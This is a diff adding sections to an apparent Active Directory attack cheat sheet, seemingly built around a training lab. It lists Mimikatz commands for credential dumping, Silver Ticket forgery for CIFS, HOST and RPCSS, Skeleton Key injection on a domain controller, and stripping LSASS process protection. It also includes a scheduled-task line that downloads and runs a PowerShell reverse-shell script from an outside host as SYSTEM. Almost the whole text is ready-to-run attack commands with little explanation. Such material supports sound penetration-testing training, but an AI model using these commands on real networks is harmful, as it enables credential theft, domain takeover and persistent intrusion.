@@ -1882,3 +1882,54 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain>
 # OR
 BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /aes256:<aes256> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
+# Silver Ticket
+### Execute mimikatz on DC as DA to get krbtgt hash
+```
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
+```
+### Make silver ticket for CIFS, below command provides access to shares on the DC
+```
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:CIFS /rc4:<local computer hash> /user:Administrator /ptt"'
+```
+### Check Access (After CIFS silver ticket)
+```
+ls \\<servername>\c$\
+```
+### Make silver ticket for Host
+```
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
+```
+### Schedule and execute a task (After host a silver ticket)
+```
+schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://10.10.10.10:8080/Invoke-PowerShellTcp.psi''')'"
+
+schtasks /Run /S ad.domain.local /TN "STCheck"
+```
+### Make a silver ticket for WMI
+```
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:HOST /rc4:<local computer hash> /user:Administrator /ptt"'
+
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /target:<target> /service:RPCSS /rc4:<local computer hash> /user:Administrator /ptt"'
+```
+### check WMI permission
+```
+Get-wmiobject -Class win32_operatingsystem -ComputerName <target>
+```
+# Skeleton Key
+### Use the below command to inject a skeleton-Key
+```
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+### Now we can access any machine with valid username and password as mimikatz
+```
+Enter-PSSession -Computername dcorp-dc.dollarcorp.moneycorp.local -credential dcorp\Administrator
+```
+### LSASS running as a protected process
+In case Lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC
+```
+mimikatz # privilege::debug
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+mimikatz # misc::skeleton
+mimikatz # !-
+```
